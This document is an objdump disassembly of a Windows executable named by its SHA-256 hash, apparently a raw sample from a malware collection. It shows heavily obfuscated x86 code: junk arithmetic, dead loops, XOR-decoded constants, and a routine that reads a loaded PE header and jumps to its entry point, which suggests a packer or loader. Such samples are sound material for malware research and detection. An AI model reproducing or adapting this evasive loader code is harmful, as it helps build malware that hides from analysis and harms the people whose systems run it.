
567a40e90f6a68b60fa37180f0d8ec2874561f549ae7781681c28bc949921cf3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	push   esi
  40100a:	lea    eax,[ebp-0xc4]
  401010:	push   eax
  401011:	add    DWORD PTR ds:0x435000,0x438000
  40101b:	push   0xf
  40101d:	sub    DWORD PTR ds:0x43701c,0x435018
  401027:	call   DWORD PTR ds:0x43a8d8
  40102d:	xor    DWORD PTR ds:0x434020,0x437010
  401037:	push   0x43a3e4
  40103c:	inc    DWORD PTR ds:0x435010
  401042:	xor    esi,esi
  401044:	inc    esi
  401045:	mov    DWORD PTR ds:0x434000,0x5c4e
  40104f:	push   esi
  401050:	dec    DWORD PTR ds:0x43401c
  401056:	push   esi
  401057:	and    DWORD PTR ds:0x438004,0x43501c
  401061:	call   DWORD PTR ds:0x43a8ec
  401067:	xor    DWORD PTR ds:0x438000,0x435010
  401071:	test   eax,eax
  401073:	mov    DWORD PTR ds:0x436018,0x4ead
  40107d:	je     0x401094
  401083:	xor    eax,eax
  401085:	mov    DWORD PTR ds:0x435008,0x2c45
  40108f:	jmp    0x40258f
  401094:	push   ebx
  401095:	xor    DWORD PTR ds:0x435008,ecx
  40109b:	mov    ebx,DWORD PTR ds:0x43a8cc
  4010a1:	inc    DWORD PTR ds:0x434004
  4010a7:	push   0x9
  4010a9:	add    DWORD PTR ds:0x434024,0x434008
  4010b3:	push   0x43a3fc
  4010b8:	call   ebx
  4010ba:	and    DWORD PTR ds:0x43800c,0x434000
  4010c4:	test   eax,eax
  4010c6:	je     0x4010ef
  4010cc:	sbb    DWORD PTR ds:0x435010,0x438014
  4010d6:	lea    eax,[ebp-0x20]
  4010d9:	push   eax
  4010da:	or     DWORD PTR ds:0x43601c,0x436010
  4010e4:	call   DWORD PTR ds:0x43a8bc
  4010ea:	jmp    0x40258e
  4010ef:	push   edi
  4010f0:	inc    edi
  4010f1:	mov    edi,DWORD PTR ds:0x43a8fc
  4010f7:	push   0x43a418
  4010fc:	adc    DWORD PTR ds:0x43401c,0x6c9b
  401106:	push   esi
  401107:	push   esi
  401108:	or     DWORD PTR ds:0x434018,0x43401c
  401112:	call   edi
  401114:	and    DWORD PTR ds:0x436004,0x434004
  40111e:	test   eax,eax
  401120:	mov    DWORD PTR ds:0x436000,0x329d
  40112a:	jne    0x40241c
  401130:	mov    esi,DWORD PTR ds:0x43a908
  401136:	or     DWORD PTR ds:0x436000,0x434018
  401140:	push   0xd
  401142:	sbb    DWORD PTR ds:0x435000,0x435010
  40114c:	push   0x43a428
  401151:	adc    DWORD PTR ds:0x43601c,0x44f1
  40115b:	call   esi
  40115d:	test   eax,eax
  40115f:	mov    DWORD PTR ds:0x43801c,0x3c7b
  401169:	je     0x401230
  40116f:	or     DWORD PTR ds:0x434028,0x4ff1
  401179:	push   0x43a43c
  40117e:	xor    DWORD PTR ds:0x434004,0x7bc9
  401188:	push   0x1
  40118a:	push   0x1
  40118c:	sub    DWORD PTR ds:0x435014,0x4cb8
  401196:	call   DWORD PTR ds:0x43a8ec
  40119c:	adc    DWORD PTR ds:0x43600c,0x5c72
  4011a6:	test   eax,eax
  4011a8:	jne    0x402440
  4011ae:	push   0x9
  4011b0:	push   0x43a454
  4011b5:	call   ebx
  4011b7:	xor    DWORD PTR ds:0x434020,0x434004
  4011c1:	test   eax,eax
  4011c3:	mov    DWORD PTR ds:0x43501c,0x26a9
  4011cd:	jne    0x40241c
  4011d3:	add    DWORD PTR ds:0x43400c,0x437000
  4011dd:	push   0x43a470
  4011e2:	or     DWORD PTR ds:0x436004,0x437018
  4011ec:	push   0x1
  4011ee:	push   0x1
  4011f0:	call   edi
  4011f2:	xor    DWORD PTR ds:0x43501c,0xa21
  4011fc:	test   eax,eax
  4011fe:	jne    0x40241c
  401204:	and    DWORD PTR ds:0x435014,0x437004
  40120e:	push   0xd
  401210:	push   0x43a480
  401215:	sbb    DWORD PTR ds:0x436010,0x7182
  40121f:	call   esi
  401221:	mov    DWORD PTR ds:0x436004,0x55a5
  40122b:	jmp    0x402440
  401230:	mov    DWORD PTR [ebp-0x10],0x0
  401237:	add    DWORD PTR ds:0x436008,ecx
  40123d:	mov    eax,DWORD PTR [ebp-0x3c]
  401240:	mov    DWORD PTR [ebp-0x3c],eax
  401243:	mov    DWORD PTR [ebp-0x8],0xf89c8585
  40124a:	add    DWORD PTR ds:0x43700c,0x15f
  401254:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  40125b:	lea    eax,[ebp-0x44]
  40125e:	mov    edi,DWORD PTR ds:0x416574
  401264:	mov    ecx,DWORD PTR ds:0x416578
  40126a:	sub    edi,ecx
  40126c:	sub    edi,DWORD PTR [edi+ecx*1]
  40126f:	mov    DWORD PTR [ebp-0x38],eax
  401272:	xor    DWORD PTR ds:0x43500c,ecx
  401278:	lea    eax,[ebp-0x48]
  40127b:	mov    DWORD PTR [ebp-0x18],eax
  40127e:	xor    edi,edi
  401280:	add    edi,DWORD PTR ds:0x434008
  401286:	xor    DWORD PTR ds:0x435014,edi
  40128c:	mov    eax,ds:0x43a2d4
  401291:	mov    eax,DWORD PTR [eax+0x1c8]
  401297:	movzx  esi,BYTE PTR ds:0x43501c
  40129e:	or     esi,DWORD PTR ds:0x437004
  4012a4:	mov    DWORD PTR ds:0x43501c,esi
  4012aa:	mov    eax,DWORD PTR [eax]
  4012ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4012af:	mov    esi,0x751089b
  4012b4:	add    DWORD PTR ds:0x438008,0x58e0
  4012be:	xor    eax,esi
  4012c0:	xor    DWORD PTR ds:0x434008,edi
  4012c6:	mov    edi,0x3272e2
  4012cb:	and    DWORD PTR ds:0x434000,0x437010
  4012d5:	add    eax,edi
  4012d7:	mov    DWORD PTR [ecx],eax
  4012d9:	mov    eax,ds:0x43a724
  4012de:	cmp    eax,0x312bc9f6
  4012e3:	jne    0x401370
  4012e9:	sbb    DWORD PTR ds:0x436010,0x463c
  4012f3:	mov    eax,DWORD PTR [ebp-0x8]
  4012f6:	mov    ecx,DWORD PTR ds:0x43a2d4
  4012fc:	inc    ebx
  4012fd:	mov    ecx,DWORD PTR [ecx+0x198]
  401303:	xor    eax,esi
  401305:	add    DWORD PTR ds:0x43701c,0x3b79
  40130f:	add    eax,edi
  401311:	mov    DWORD PTR [ecx],eax
  401313:	neg    DWORD PTR ds:0x436008
  401319:	mov    eax,DWORD PTR [ebp-0x8]
  40131c:	xor    eax,esi
  40131e:	and    DWORD PTR ds:0x437008,0x0
  401328:	jmp    0x40133a
  40132d:	mov    ebx,DWORD PTR ds:0x437008
  401333:	inc    ebx
  401334:	mov    DWORD PTR ds:0x437008,ebx
  40133a:	cmp    DWORD PTR ds:0x437008,0x12
  401341:	jae    0x401369
  401347:	cmp    DWORD PTR ds:0x437008,0x17
  40134e:	jg     0x401369
  401354:	jmp    0x401364
  401359:	push   0x426b
  40135e:	call   DWORD PTR ds:0x43a8c4
  401364:	jmp    0x40132d
  401369:	add    eax,edi
  40136b:	mov    ds:0x43a724,eax
  401370:	mov    eax,ds:0x43a2d4
  401375:	add    ebx,0x1d59
  40137b:	mov    eax,DWORD PTR [eax+0x18c]
  401381:	mov    eax,DWORD PTR [eax]
  401383:	mov    ebx,DWORD PTR ds:0x416538
  401389:	mov    ebx,DWORD PTR [ebx]
  40138b:	and    DWORD PTR ds:0x436004,ebx
  401391:	mov    DWORD PTR [ebp-0x7c],eax
  401394:	mov    eax,ds:0x416530
  401399:	mov    ebx,DWORD PTR ds:0x4165b8
  40139f:	sub    eax,ebx
  4013a1:	sub    eax,DWORD PTR [eax+ebx*1]
  4013a4:	mov    eax,0xf89c85b9
  4013a9:	mov    DWORD PTR [ebp-0x10],eax
  4013ac:	sbb    DWORD PTR ds:0x43500c,ebx
  4013b2:	mov    DWORD PTR [ebp-0x10],eax
  4013b5:	adc    DWORD PTR ds:0x436008,edx
  4013bb:	mov    DWORD PTR [ebp-0x10],eax
  4013be:	mov    DWORD PTR ds:0x434000,0x12
  4013c8:	cmp    DWORD PTR ds:0x434000,0x0
  4013cf:	je     0x401402
  4013d5:	cmp    DWORD PTR ds:0x434000,0x17
  4013dc:	jg     0x401402
  4013e2:	jmp    0x4013f0
  4013e7:	push   DWORD PTR [ebp-0x14]
  4013ea:	call   DWORD PTR ds:0x43a8c8
  4013f0:	mov    ebx,DWORD PTR ds:0x434000
  4013f6:	dec    ebx
  4013f7:	mov    DWORD PTR ds:0x434000,ebx
  4013fd:	jmp    0x4013c8
  401402:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  401409:	and    DWORD PTR ds:0x436004,0x0
  401413:	jmp    0x401425
  401418:	mov    ebx,DWORD PTR ds:0x436004
  40141e:	inc    ebx
  40141f:	mov    DWORD PTR ds:0x436004,ebx
  401425:	cmp    DWORD PTR ds:0x436004,0x15
  40142c:	jae    0x401454
  401432:	cmp    DWORD PTR ds:0x436004,0x1c
  401439:	ja     0x401454
  40143f:	jmp    0x40144f
  401444:	push   0x43a097
  401449:	call   DWORD PTR ds:0x43a8d0
  40144f:	jmp    0x401418
  401454:	mov    DWORD PTR [ebp-0x10],eax
  401457:	adc    ebx,0x4a4f
  40145d:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401464:	movzx  ebx,WORD PTR ds:0x434000
  40146b:	xor    ebx,DWORD PTR ds:0x438000
  401471:	mov    DWORD PTR ds:0x434000,ebx
  401477:	mov    ebx,DWORD PTR [ebp-0x8]
  40147a:	xor    ebx,esi
  40147c:	or     DWORD PTR ds:0x436000,0x43801c
  401486:	add    ebx,edi
  401488:	mov    DWORD PTR ds:0x434004,0x16bd
  401492:	jmp    0x401599
  401497:	adc    eax,DWORD PTR ds:0x437010
  40149d:	mov    eax,DWORD PTR [ebp-0xc]
  4014a0:	add    DWORD PTR ds:0x43600c,0x435004
  4014aa:	xor    eax,esi
  4014ac:	sub    DWORD PTR ds:0x434024,0x438008
  4014b6:	lea    eax,[eax+ebx*1+0x3272e2]
  4014bd:	or     DWORD PTR ds:0x43401c,0x36
  4014c7:	push   eax
  4014c8:	neg    DWORD PTR ds:0x43401c
  4014ce:	mov    eax,DWORD PTR [ebp-0x18]
  4014d1:	xor    eax,esi
  4014d3:	adc    DWORD PTR ds:0x437004,0x7bd1
  4014dd:	lea    eax,[ebp+eax*1+0x3272ea]
  4014e4:	or     DWORD PTR ds:0x434028,0x5a2b
  4014ee:	push   eax
  4014ef:	and    DWORD PTR ds:0x435010,0x0
  4014f9:	jmp    0x401509
  4014fe:	mov    eax,ds:0x435010
  401503:	inc    eax
  401504:	mov    ds:0x435010,eax
  401509:	cmp    DWORD PTR ds:0x435010,0x1b
  401510:	jae    0x401550
  401516:	cmp    DWORD PTR ds:0x435010,0x8
  40151d:	jl     0x401550
  401523:	jmp    0x401533
  401528:	push   0x43a111
  40152d:	call   DWORD PTR ds:0x43a8d4
  401533:	cmp    DWORD PTR ds:0x435010,0x7
  40153a:	jne    0x40154b
  401540:	mov    eax,ds:0x435010
  401545:	inc    eax
  401546:	mov    ds:0x435010,eax
  40154b:	jmp    0x4014fe
  401550:	mov    eax,ds:0x43a2d4
  401555:	sub    DWORD PTR ds:0x438000,0x71a4
  40155f:	push   DWORD PTR [eax+0x1bc]
  401565:	adc    DWORD PTR ds:0x436008,0x7f70
  40156f:	call   0x402598
  401574:	movzx  ecx,BYTE PTR ds:0x434020
  40157b:	sbb    DWORD PTR ds:0x434008,ecx
  401581:	mov    eax,DWORD PTR [ebp-0xc]
  401584:	adc    ecx,DWORD PTR ds:0x438018
  40158a:	xor    eax,esi
  40158c:	sbb    ecx,DWORD PTR ds:0x437000
  401592:	lea    ebx,[ebx+eax*1+0x3272e2]
  401599:	mov    ecx,DWORD PTR ds:0x434018
  40159f:	add    DWORD PTR ds:0x436000,ecx
  4015a5:	mov    eax,DWORD PTR [ebp-0xc]
  4015a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ab:	adc    DWORD PTR ds:0x43801c,0x43400c
  4015b5:	xor    ecx,esi
  4015b7:	xor    DWORD PTR ds:0x43800c,0x6ae7
  4015c1:	xor    eax,esi
  4015c3:	add    eax,ecx
  4015c5:	xor    ecx,0x639d
  4015cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ce:	sbb    DWORD PTR ds:0x437004,0x435008
  4015d8:	xor    ecx,esi
  4015da:	lea    eax,[eax+ecx*1+0x9758a6]
  4015e1:	mov    DWORD PTR ds:0x437018,0x6f5b
  4015eb:	cmp    ebx,eax
  4015ed:	jbe    0x401497
  4015f3:	mov    eax,DWORD PTR [ebp+0xc]
  4015f6:	and    DWORD PTR ds:0x43601c,ebx
  4015fc:	mov    ds:0x43a158,eax
  401601:	mov    eax,DWORD PTR [ebp+0x10]
  401604:	mov    DWORD PTR ds:0x435004,0xee9
  40160e:	mov    ds:0x43a3ac,eax
  401613:	sbb    DWORD PTR ds:0x436000,ebx
  401619:	mov    eax,ds:0x43a158
  40161e:	neg    ecx
  401620:	mov    ecx,DWORD PTR [ebp-0x38]
  401623:	sub    eax,edi
  401625:	xor    eax,esi
  401627:	mov    DWORD PTR ds:0x438010,0x5a04
  401631:	mov    DWORD PTR [ecx],eax
  401633:	mov    DWORD PTR ds:0x438010,ecx
  401639:	mov    eax,DWORD PTR [ebp-0x3c]
  40163c:	mov    DWORD PTR ds:0x43701c,0x1a94
  401646:	cmp    eax,0xf89c8585
  40164b:	mov    DWORD PTR ds:0x43501c,0x7d63
  401655:	jne    0x401b36
  40165b:	or     DWORD PTR ds:0x43400c,0x43501c
  401665:	push   0x43a494
  40166a:	xor    ebx,ebx
  40166c:	mov    DWORD PTR ds:0x43700c,0x6301
  401676:	inc    ebx
  401677:	and    DWORD PTR ds:0x437014,0x438000
  401681:	push   ebx
  401682:	push   ebx
  401683:	adc    DWORD PTR ds:0x436010,0x6629
  40168d:	call   DWORD PTR ds:0x43a8ec
  401693:	or     DWORD PTR ds:0x435008,0x107f
  40169d:	test   eax,eax
  40169f:	jne    0x402440
  4016a5:	xor    DWORD PTR ds:0x434014,0x437000
  4016af:	push   0x9
  4016b1:	push   0x43a4ac
  4016b6:	xor    DWORD PTR ds:0x43701c,0x434028
  4016c0:	call   DWORD PTR ds:0x43a8cc
  4016c6:	test   eax,eax
  4016c8:	jne    0x40241c
  4016ce:	adc    DWORD PTR ds:0x438010,0x6458
  4016d8:	push   0x43a4c8
  4016dd:	push   ebx
  4016de:	push   ebx
  4016df:	call   DWORD PTR ds:0x43a8fc
  4016e5:	test   eax,eax
  4016e7:	mov    DWORD PTR ds:0x434014,0x6a9b
  4016f1:	jne    0x40241c
  4016f7:	add    DWORD PTR ds:0x434018,0x437004
  401701:	push   0xd
  401703:	neg    DWORD PTR ds:0x438004
  401709:	push   0x43a4d8
  40170e:	and    DWORD PTR ds:0x435010,0x62ab
  401718:	call   DWORD PTR ds:0x43a908
  40171e:	or     DWORD PTR ds:0x435008,0x43600c
  401728:	test   eax,eax
  40172a:	jne    0x402440
  401730:	sbb    DWORD PTR ds:0x436010,0x438018
  40173a:	lea    eax,[ebp-0x34]
  40173d:	sub    DWORD PTR ds:0x43500c,0x6999
  401747:	mov    DWORD PTR [ebp-0x9c],eax
  40174d:	lea    eax,[ebp+0x4]
  401750:	or     DWORD PTR ds:0x43700c,0x43601c
  40175a:	mov    DWORD PTR [ebp-0x34],eax
  40175d:	xor    eax,DWORD PTR ds:0x43600c
  401763:	mov    eax,DWORD PTR [ebp-0x34]
  401766:	and    DWORD PTR ds:0x43401c,0x436018
  401770:	test   eax,eax
  401772:	je     0x402572
  401778:	xor    eax,ecx
  40177a:	mov    eax,DWORD PTR [ebp-0x28]
  40177d:	mov    eax,DWORD PTR [ebp-0xc]
  401780:	xor    DWORD PTR ds:0x434008,0x3c87
  40178a:	mov    eax,DWORD PTR [ebp-0x8]
  40178d:	and    DWORD PTR ds:0x434008,0x0
  401797:	xor    ecx,ecx
  401799:	add    ecx,DWORD PTR ds:0x434008
  40179f:	inc    ecx
  4017a0:	mov    DWORD PTR ds:0x434008,ecx
  4017a6:	cmp    DWORD PTR ds:0x434008,0x23
  4017ad:	jbe    0x4017ce
  4017b3:	jmp    0x4017c1
  4017b8:	push   DWORD PTR [ebp-0x20]
  4017bb:	call   DWORD PTR ds:0x43a8dc
  4017c1:	cmp    DWORD PTR ds:0x434008,0x15
  4017c8:	jb     0x401797
  4017ce:	mov    DWORD PTR [ebp+0xc],eax
  4017d1:	mov    DWORD PTR ds:0x43400c,0x1d
  4017db:	cmp    DWORD PTR ds:0x43400c,0x0
  4017e2:	je     0x40183c
  4017e8:	cmp    DWORD PTR ds:0x43400c,0x3
  4017ef:	ja     0x40183c
  4017f5:	jmp    0x40180e
  4017fa:	push   0x43a0c9
  4017ff:	push   DWORD PTR [ebp-0x18]
  401802:	push   DWORD PTR [ebp-0x28]
  401805:	push   DWORD PTR [ebp-0x1c]
  401808:	call   DWORD PTR ds:0x43a8e0
  40180e:	cmp    DWORD PTR ds:0x43400c,0x4
  401815:	jne    0x40182a
  40181b:	xor    ecx,ecx
  40181d:	add    ecx,DWORD PTR ds:0x43400c
  401823:	dec    ecx
  401824:	mov    DWORD PTR ds:0x43400c,ecx
  40182a:	mov    ecx,DWORD PTR ds:0x43400c
  401830:	dec    ecx
  401831:	mov    DWORD PTR ds:0x43400c,ecx
  401837:	jmp    0x4017db
  40183c:	mov    eax,eax
  40183e:	and    DWORD PTR ds:0x43401c,0x0
  401848:	jmp    0x40185c
  40184d:	xor    ecx,ecx
  40184f:	add    ecx,DWORD PTR ds:0x43401c
  401855:	inc    ecx
  401856:	mov    DWORD PTR ds:0x43401c,ecx
  40185c:	cmp    DWORD PTR ds:0x43401c,0x14
  401863:	jae    0x4018b6
  401869:	cmp    DWORD PTR ds:0x43401c,0x9
  401870:	jge    0x4018b6
  401876:	jmp    0x401897
  40187b:	push   DWORD PTR [ebp-0x14]
  40187e:	push   0x434004
  401883:	push   DWORD PTR [ebp-0x24]
  401886:	push   0x43a07b
  40188b:	push   DWORD PTR [ebp-0x20]
  40188e:	push   DWORD PTR [ebp-0x18]
  401891:	call   DWORD PTR ds:0x43a8e4
  401897:	cmp    DWORD PTR ds:0x43401c,0x8
  40189e:	jne    0x4018b1
  4018a4:	mov    ecx,DWORD PTR ds:0x43401c
  4018aa:	inc    ecx
  4018ab:	mov    DWORD PTR ds:0x43401c,ecx
  4018b1:	jmp    0x40184d
  4018b6:	mov    eax,ds:0x43a2d4
  4018bb:	or     DWORD PTR ds:0x434008,0x6b78
  4018c5:	mov    eax,DWORD PTR [eax+0x1c8]
  4018cb:	mov    eax,DWORD PTR [eax]
  4018cd:	mov    DWORD PTR ds:0x43400c,0x1f
  4018d7:	cmp    DWORD PTR ds:0x43400c,0x0
  4018de:	je     0x40191e
  4018e4:	cmp    DWORD PTR ds:0x43400c,0x21
  4018eb:	jbe    0x40191e
  4018f1:	jmp    0x40190a
  4018f6:	push   0x1259
  4018fb:	push   DWORD PTR [ebp-0x10]
  4018fe:	push   DWORD PTR [ebp-0x28]
  401901:	push   DWORD PTR [ebp-0xc]
  401904:	call   DWORD PTR ds:0x43a8e8
  40190a:	xor    ecx,ecx
  40190c:	xor    ecx,DWORD PTR ds:0x43400c
  401912:	dec    ecx
  401913:	mov    DWORD PTR ds:0x43400c,ecx
  401919:	jmp    0x4018d7
  40191e:	cdq    
  40191f:	mov    ebx,eax
  401921:	mov    DWORD PTR ds:0x435000,0x1d
  40192b:	cmp    DWORD PTR ds:0x435000,0x0
  401932:	je     0x401964
  401938:	cmp    DWORD PTR ds:0x435000,0x28
  40193f:	ja     0x401964
  401945:	jmp    0x401950
  40194a:	call   DWORD PTR ds:0x43a8f0
  401950:	xor    ecx,ecx
  401952:	add    ecx,DWORD PTR ds:0x435000
  401958:	dec    ecx
  401959:	mov    DWORD PTR ds:0x435000,ecx
  40195f:	jmp    0x40192b
  401964:	mov    eax,0xfabdbee7
  401969:	add    ebx,eax
  40196b:	mov    DWORD PTR ds:0x43501c,ebx
  401971:	adc    edx,0xffffffff
  401974:	and    ecx,DWORD PTR ds:0x434018
  40197a:	and    DWORD PTR [ebp-0x10],0x0
  40197e:	xor    edx,0x0
  401981:	mov    DWORD PTR [ebp-0x6c],edx
  401984:	mov    edx,DWORD PTR [ebp+0xc]
  401987:	mov    DWORD PTR [ebp-0x14],edx
  40198a:	and    ecx,edx
  40198c:	mov    ecx,0x8a29a12d
  401991:	and    DWORD PTR ds:0x437018,0x6956
  40199b:	xor    ebx,ecx
  40199d:	add    DWORD PTR [ebp-0x14],eax
  4019a0:	mov    edx,DWORD PTR [ebp-0x14]
  4019a3:	mov    DWORD PTR ds:0x437018,0xe51
  4019ad:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4019b1:	adc    DWORD PTR ds:0x43401c,0x434014
  4019bb:	xor    edx,ecx
  4019bd:	sub    DWORD PTR ds:0x438018,0x437000
  4019c7:	mov    DWORD PTR [ebp-0x5c],edx
  4019ca:	mov    edx,DWORD PTR [ebp-0x10]
  4019cd:	xor    edx,0x0
  4019d0:	mov    DWORD PTR [ebp-0x58],edx
  4019d3:	mov    DWORD PTR ds:0x43600c,0x7e33
  4019dd:	cmp    DWORD PTR [ebp-0x5c],ebx
  4019e0:	mov    DWORD PTR ds:0x434010,0x71c9
  4019ea:	jne    0x401a0c
  4019f0:	mov    edx,DWORD PTR ds:0x434004
  4019f6:	mov    edx,DWORD PTR [ebp-0x6c]
  4019f9:	cmp    DWORD PTR [ebp-0x58],edx
  4019fc:	mov    DWORD PTR ds:0x43600c,0x7cc1
  401a06:	je     0x401aa7
  401a0c:	mov    DWORD PTR ds:0x434018,0x1c
  401a16:	cmp    DWORD PTR ds:0x434018,0x0
  401a1d:	je     0x401a50
  401a23:	cmp    DWORD PTR ds:0x434018,0x29
  401a2a:	jbe    0x401a50
  401a30:	jmp    0x401a3e
  401a35:	push   DWORD PTR [ebp-0x28]
  401a38:	call   DWORD PTR ds:0x43a8f4
  401a3e:	mov    edx,DWORD PTR ds:0x434018
  401a44:	dec    edx
  401a45:	mov    DWORD PTR ds:0x434018,edx
  401a4b:	jmp    0x401a16
  401a50:	mov    edx,DWORD PTR ds:0x43a2d4
  401a56:	or     DWORD PTR ds:0x436018,0x438010
  401a60:	mov    edx,DWORD PTR [edx+0x1c0]
  401a66:	add    DWORD PTR ds:0x434018,0x436004
  401a70:	mov    edx,DWORD PTR [edx]
  401a72:	xor    ebx,ebx
  401a74:	add    edx,eax
  401a76:	adc    ebx,0xffffffff
  401a79:	xor    edx,ecx
  401a7b:	xor    ebx,0x0
  401a7e:	cmp    edx,0x70941fc5
  401a84:	mov    DWORD PTR ds:0x438014,0x6222
  401a8e:	jne    0x402572
  401a94:	cmp    ebx,0xffffffff
  401a97:	mov    DWORD PTR ds:0x436010,0x168c
  401aa1:	jne    0x402572
  401aa7:	mov    edx,DWORD PTR ds:0x43a350
  401aad:	or     DWORD PTR ds:0x43501c,0x338f
  401ab7:	mov    ebx,DWORD PTR ds:0x43a358
  401abd:	sbb    DWORD PTR ds:0x43501c,0x434008
  401ac7:	xor    edx,ebx
  401ac9:	and    DWORD PTR ds:0x438000,0x0
  401ad3:	jmp    0x401ae5
  401ad8:	mov    ebx,DWORD PTR ds:0x438000
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x438000,ebx
  401ae5:	cmp    DWORD PTR ds:0x438000,0x1a
  401aec:	jae    0x401b17
  401af2:	cmp    DWORD PTR ds:0x438000,0x29
  401af9:	jl     0x401b17
  401aff:	jmp    0x401b12
  401b04:	push   0x4320
  401b09:	push   DWORD PTR [ebp-0x28]
  401b0c:	call   DWORD PTR ds:0x43a8f8
  401b12:	jmp    0x401ad8
  401b17:	mov    DWORD PTR ds:0x43a350,edx
  401b1d:	mov    edx,DWORD PTR [ebp-0x34]
  401b20:	mov    ebx,DWORD PTR ds:0x43a350
  401b26:	add    ebx,DWORD PTR [edx]
  401b28:	not    DWORD PTR ds:0x43801c
  401b2e:	mov    edx,DWORD PTR [ebp-0x34]
  401b31:	jmp    0x402531
  401b36:	mov    eax,DWORD PTR [ebp-0x44]
  401b39:	mov    DWORD PTR ds:0x436000,0x3783
  401b43:	cmp    eax,0xf89c8584
  401b48:	mov    DWORD PTR ds:0x434000,0x66dd
  401b52:	je     0x401d61
  401b58:	xor    eax,eax
  401b5a:	xor    eax,DWORD PTR ds:0x434018
  401b60:	adc    eax,DWORD PTR ds:0x434024
  401b66:	mov    ds:0x434018,eax
  401b6b:	mov    eax,DWORD PTR [ebp-0x8]
  401b6e:	mov    ecx,DWORD PTR [ebp-0x48]
  401b71:	xor    eax,esi
  401b73:	add    eax,edi
  401b75:	mov    DWORD PTR ds:0x436004,0x39e8
  401b7f:	cmp    eax,ecx
  401b81:	mov    DWORD PTR ds:0x434018,0x5d7a
  401b8b:	je     0x401d61
  401b91:	xor    DWORD PTR ds:0x434000,0x3742
  401b9b:	push   0x43a5f4
  401ba0:	xor    esi,esi
  401ba2:	inc    esi
  401ba3:	sbb    DWORD PTR ds:0x43801c,0x434008
  401bad:	push   esi
  401bae:	sub    DWORD PTR ds:0x43701c,0x437018
  401bb8:	push   esi
  401bb9:	adc    DWORD PTR ds:0x436004,0x30fb
  401bc3:	call   DWORD PTR ds:0x43a8ec
  401bc9:	or     DWORD PTR ds:0x435000,0x43400c
  401bd3:	test   eax,eax
  401bd5:	mov    DWORD PTR ds:0x437010,0x752e
  401bdf:	jne    0x402440
  401be5:	mov    DWORD PTR ds:0x43501c,0xd2c
  401bef:	push   0x9
  401bf1:	add    DWORD PTR ds:0x43500c,0x3ba4
  401bfb:	push   0x43a60c
  401c00:	call   DWORD PTR ds:0x43a8cc
  401c06:	test   eax,eax
  401c08:	jne    0x40241c
  401c0e:	and    DWORD PTR ds:0x43401c,0x438010
  401c18:	push   0x43a628
  401c1d:	push   esi
  401c1e:	push   esi
  401c1f:	sbb    DWORD PTR ds:0x436000,0x437014
  401c29:	call   DWORD PTR ds:0x43a8fc
  401c2f:	or     DWORD PTR ds:0x43400c,0x434020
  401c39:	test   eax,eax
  401c3b:	mov    DWORD PTR ds:0x438018,0x4ca0
  401c45:	jne    0x40241c
  401c4b:	push   0xd
  401c4d:	add    DWORD PTR ds:0x437000,0x43400c
  401c57:	push   0x43a638
  401c5c:	call   DWORD PTR ds:0x43a908
  401c62:	add    DWORD PTR ds:0x437018,0x7176
  401c6c:	test   eax,eax
  401c6e:	jne    0x402440
  401c74:	mov    DWORD PTR ds:0x436000,0x1e
  401c7e:	cmp    DWORD PTR ds:0x436000,0x0
  401c85:	je     0x401cd4
  401c8b:	cmp    DWORD PTR ds:0x436000,0x10
  401c92:	jle    0x401cd4
  401c98:	jmp    0x401ca8
  401c9d:	push   0x435014
  401ca2:	call   DWORD PTR ds:0x43a900
  401ca8:	cmp    DWORD PTR ds:0x436000,0x11
  401caf:	jne    0x401cc2
  401cb5:	mov    ecx,DWORD PTR ds:0x436000
  401cbb:	dec    ecx
  401cbc:	mov    DWORD PTR ds:0x436000,ecx
  401cc2:	mov    ecx,DWORD PTR ds:0x436000
  401cc8:	dec    ecx
  401cc9:	mov    DWORD PTR ds:0x436000,ecx
  401ccf:	jmp    0x401c7e
  401cd4:	mov    eax,ds:0x43a2d4
  401cd9:	mov    ecx,DWORD PTR ds:0x435004
  401cdf:	or     DWORD PTR ds:0x438010,ecx
  401ce5:	mov    eax,DWORD PTR [eax+0x194]
  401ceb:	mov    ecx,DWORD PTR [eax]
  401ced:	mov    eax,DWORD PTR [ecx+0x3c]
  401cf0:	push   DWORD PTR ds:0x43a3ac
  401cf6:	mov    DWORD PTR ds:0x435014,0x6873
  401d00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401d04:	push   DWORD PTR ds:0x43a158
  401d0a:	mov    DWORD PTR ds:0x43400c,0x7a94
  401d14:	add    eax,ecx
  401d16:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d1c:	or     DWORD PTR ds:0x437010,0x5a23
  401d26:	mov    ecx,DWORD PTR [ecx+0x194]
  401d2c:	mov    DWORD PTR ds:0x436008,0x65e8
  401d36:	push   DWORD PTR [ecx]
  401d38:	sbb    DWORD PTR ds:0x43401c,0x5228
  401d42:	call   eax
  401d44:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d4a:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d50:	mov    DWORD PTR ds:0x437014,0xc7a
  401d5a:	mov    DWORD PTR [ecx],eax
  401d5c:	jmp    0x402572
  401d61:	adc    DWORD PTR ds:0x43700c,0x4142
  401d6b:	push   0x43a4ec
  401d70:	adc    DWORD PTR ds:0x435008,0x3813
  401d7a:	xor    ebx,ebx
  401d7c:	sbb    DWORD PTR ds:0x43801c,0x3514
  401d86:	inc    ebx
  401d87:	not    DWORD PTR ds:0x435008
  401d8d:	push   ebx
  401d8e:	push   ebx
  401d8f:	call   DWORD PTR ds:0x43a8ec
  401d95:	or     DWORD PTR ds:0x436010,0x434018
  401d9f:	test   eax,eax
  401da1:	mov    DWORD PTR ds:0x437008,0x71b6
  401dab:	jne    0x402440
  401db1:	or     DWORD PTR ds:0x438010,0x434014
  401dbb:	push   0x9
  401dbd:	add    DWORD PTR ds:0x437008,0x6ead
  401dc7:	push   0x43a504
  401dcc:	add    DWORD PTR ds:0x437010,0x12d1
  401dd6:	call   DWORD PTR ds:0x43a8cc
  401ddc:	add    DWORD PTR ds:0x434014,0x5154
  401de6:	test   eax,eax
  401de8:	mov    DWORD PTR ds:0x43600c,0xb65
  401df2:	jne    0x40241c
